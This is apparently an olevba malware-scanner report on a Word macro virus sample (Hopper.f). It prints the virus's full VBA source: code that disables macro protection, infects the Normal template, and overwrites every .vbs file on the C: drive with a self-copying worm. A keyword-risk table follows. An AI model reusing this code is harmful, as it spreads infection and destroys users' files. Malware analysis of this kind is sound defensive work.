olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hopper.f-d900be988df2f48fab01e1acec7b1028b543c2ac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSWord.Hopper.f-d900be988df2f48fab01e1acec7b1028b543c2ac - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio1.cls 
in file: Virus.MSWord.Hopper.f-d900be988df2f48fab01e1acec7b1028b543c2ac - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio2.cls 
in file: Virus.MSWord.Hopper.f-d900be988df2f48fab01e1acec7b1028b543c2ac - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio3.cls 
in file: Virus.MSWord.Hopper.f-d900be988df2f48fab01e1acec7b1028b543c2ac - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hopper.f-d900be988df2f48fab01e1acec7b1028b543c2ac - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'1nternal
On Error GoTo Break
        Set A = ActiveDocument.VBProject.VBComponents(1).CodeModule
        Set N = NormalTemplate.VBProject.VBComponents(1).CodeModule
        Options.VirusProtection = False
        Options.ConfirmConversions = False
        Options.SaveNormalPrompt = False
        If N.Lines(2, 1) <> "'1nternal" Then
                For i = 1 To 58
                        N.InsertLines i, A.Lines(i, 1)
                Next
        End If
        If A.Lines(2, 1) <> "'1nternal" Then
                For i = 1 To 58
                        A.InsertLines i, N.Lines(i, 1)
                Next
        End If
        Set FSO = CreateObject("Scripting.FileSystemObject")
        N.InsertLines 59, ""
        N.InsertLines 60, "On Error Resume Next"
        N.InsertLines 61, "Dim WordObj, FSO, WshShell"
        N.InsertLines 62, "Set FSO = CreateObject(" + Chr(34) + "Scripting.FileSystemObject" + Chr(34) + ")"
        N.InsertLines 63, "Set WshShell = Wscript.CreateObject(" + Chr(34) + "Wscript.Shell" + Chr(34) + ")"
        N.InsertLines 64, "parent = Wscript.ScriptFullName"
        N.InsertLines 65, "vPath = Left(parent, InStrRev(parent, " + Chr(34) + "\" + Chr(34) + "))"
        N.InsertLines 66, "For Each target in FSO.GetFolder(vPath).Files"
        N.InsertLines 67, "    FSO.CopyFile parent, target.Name, 1"
        N.InsertLines 68, "Next"
        N.InsertLines 69, "Set WordObj = CreateObject(" + Chr(34) + "Word.Application" + Chr(34) + ")"
        N.InsertLines 70, "WordObj.Options.SaveNormalPrompt = False"
        N.InsertLines 71, "Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule"
        N.InsertLines 72, "If NT.Lines(2,1) <> " + Chr(34) + "'1nternal" + Chr(34) + " Then"
        N.InsertLines 73, "     NT.AddfromFile Wscript.ScriptFullName"
        N.InsertLines 74, "     NT.ReplaceLine 3, " + Chr(34) + "On Error Goto Break" + Chr(34)
        N.InsertLines 75, "     NT.DeleteLines 58, 19"
        N.InsertLines 76, "End If"
        N.InsertLines 77, "Set NT = Nothing"
        N.InsertLines 78, "WordObj.Quit"

        Set fs = Application.FileSearch
                fs.NewSearch
                fs.LookIn = "C:\"
                fs.SearchSubFolders = True
                fs.FileName = "*.vbs"
                fs.Execute
                For i = 1 To fs.FoundFiles.Count
                        Set f = FSO.OpenTextFile(fs.FoundFiles(i), 2, True)
                        N.ReplaceLine 3, "'ReplaceIt"
                        For k = 1 To 78
                                f.Write N.Lines(k, 1) + Chr(13) + Chr(10)
                        Next
                    f.Close
                Next
        N.DeleteLines 59, 20
N.ReplaceLine 3, "On Error Goto Break"
Break:
Set NT = Nothing
WordObj.Quit
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

